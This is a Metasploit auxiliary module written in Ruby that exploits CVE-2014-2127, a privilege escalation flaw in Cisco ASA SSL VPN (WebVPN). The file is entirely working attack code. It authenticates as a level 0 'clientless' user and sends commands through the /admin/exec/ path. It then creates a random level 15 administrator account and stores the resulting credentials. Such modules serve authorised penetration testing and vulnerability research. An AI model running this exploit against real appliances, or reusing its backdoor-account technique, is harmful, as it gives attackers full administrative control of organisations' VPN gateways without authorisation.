##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
      'Description' => %q{
        This module exploits a privilege escalation vulnerability for Cisco
        ASA SSL VPN (aka: WebVPN). It allows level 0 users to escalate to
        level 15.
      },
      'Author'       =>
        [
          'jclaudius <jclaudius[at]trustwave.com>',
          'lguay <laura.r.guay[at]gmail.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-2127'],
          ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
          ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
        ],
      'DisclosureDate' => 'Apr 09 2014',
      'DefaultOptions' => { 'SSL' => true }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'clientless']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'clientless']),
        OptString.new('GROUP', [true, "A specific VPN group to use", 'clientless']),
        OptInt.new('RETRIES', [true, 'The number of exploit attempts to make', 10])
      ], self.class
    )

  end

  def validate_cisco_ssl_vpn
    begin
      res = send_request_cgi(
              'uri' => '/',
              'method' => 'GET'
            )

      vprint_good("Server is responsive")
    rescue ::Rex::ConnectionError, ::Errno::EPIPE
      return false
    end

    res = send_request_cgi(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET'
          )

    if res &&
       res.code == 302

      res = send_request_cgi(
              'uri' => '/+CSCOE+/logon.html',
              'method' => 'GET',
              'vars_get' => { 'fcadbadd' => "1" }
            )
    end

    if res &&
       res.code == 200 &&
       res.body.include?('webvpnlogin')
      return true
    else
      return false
    end
  end

  def do_logout(cookie)
    res = send_request_cgi(
            'uri' => '/+webvpn+/webvpn_logout.html',
            'method' => 'GET',
            'cookie' => cookie
          )

    if res &&
       res.code == 200
      vprint_good("Logged out")
    end
  end

  def run_command(cmd, cookie)
    reformatted_cmd = cmd.gsub(/ /, "+")

    res = send_request_cgi(
            'uri'       => "/admin/exec/#{reformatted_cmd}",
            'method'    => 'GET',
            'cookie'    => cookie
          )

    res
  end

  def do_show_version(cookie, tries = 3)
    # Make up to three attempts because server can be a little flaky
    tries.times do |i|
      command = "show version"
      resp = run_command(command, cookie)

      if resp &&
         resp.body.include?('Cisco Adaptive Security Appliance Software Version')
        return resp.body
      else
        vprint_error("Unable to run '#{command}'")
        vprint_good("Retrying #{i} '#{command}'") unless i == 2
      end
    end

    return nil
  end

  def add_user(cookie, tries = 3)
    username = Rex::Text.rand_text_alpha_lower(8)
    password = Rex::Text.rand_text_alphanumeric(20)

    tries.times do |i|
      vprint_good("Attemping to add User: #{username}, Pass: #{password}")
      command = "username #{username} password #{password} privilege 15"
      resp = run_command(command, cookie)

      if resp &&
         !resp.body.include?('Command authorization failed') &&
         !resp.body.include?('Command failed')
        vprint_good("Privilege Escalation Appeared Successful")
        return [username, password]
      else
        vprint_error("Unable to run '#{command}'")
        vprint_good("Retrying #{i} '#{command}'") unless i == tries - 1
      end
    end

    return nil
  end

  def do_login(user, pass, group)
    begin
      cookie = "webvpn=; " +
               "webvpnc=; " +
               "webvpn_portal=; " +
               "webvpnSharePoint=; " +
               "webvpnlogin=1; " +
               "webvpnLang=en;"

      post_params = {
        'tgroup' => '',
        'next' => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login' => 'Logon'
      }

      post_params['group_list'] = group unless group.empty?

      resp = send_request_cgi(
              'uri' => '/+webvpn+/index.html',
              'method'    => 'POST',
              'ctype'     => 'application/x-www-form-urlencoded',
              'cookie'    => cookie,
              'vars_post' => post_params
            )

      if resp &&
         resp.code == 200 &&
         resp.body.include?('SSL VPN Service') &&
         resp.body.include?('webvpn_logout')

        vprint_good("Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
        return resp.get_cookies
      else
        return false
      end

    rescue ::Rex::ConnectionError, ::Errno::EPIPE
      return false
    end
  end

  def run_host(ip)
    # Validate we're dealing with Cisco SSL VPN
    unless validate_cisco_ssl_vpn
      vprint_error("Does not appear to be Cisco SSL VPN")
      return
    end

    # This is crude, but I've found this to be somewhat
    # interimittent based on session, so we'll just retry
    # 'X' times.
    datastore['RETRIES'].times do |i|
      vprint_good("Exploit Attempt ##{i}")

      # Authenticate to SSL VPN and get session cookie
      cookie = do_login(
                 datastore['USERNAME'],
                 datastore['PASSWORD'],
                 datastore['GROUP']
               )

      # See if our authentication attempt failed
      unless cookie
        vprint_error("Failed to login to Cisco SSL VPN")
        next
      end

      # Grab version
      version = do_show_version(cookie)

      if version &&
         version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
        print_good("Show version succeeded. Version is Cisco ASA #{version_match[1]}")
      else
        do_logout(cookie)
        vprint_error("Show version failed")
        next
      end

      # Attempt to add an admin user
      creds = add_user(cookie)
      do_logout(cookie)

      if creds
        print_good("Successfully added level 15 account #{creds.join(", ")}")
        user, pass = creds
        report_escalated_creds(user, pass)
      else
        vprint_error("Failed to created user account on Cisco SSL VPN")
      end
    end
  end

  def report_escalated_creds(username, password)
    status = Metasploit::Model::Login::Status::SUCCESSFUL

    service_data = {
        address: rhost,
        port: rport,
        service_name: 'https',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        private_type: :password,
        private_data: password,
        username: username
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)
    login_data = {
        core: credential_core,
        access_level: 'Level 15',
        status: status,
        last_attempted_at: DateTime.now
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
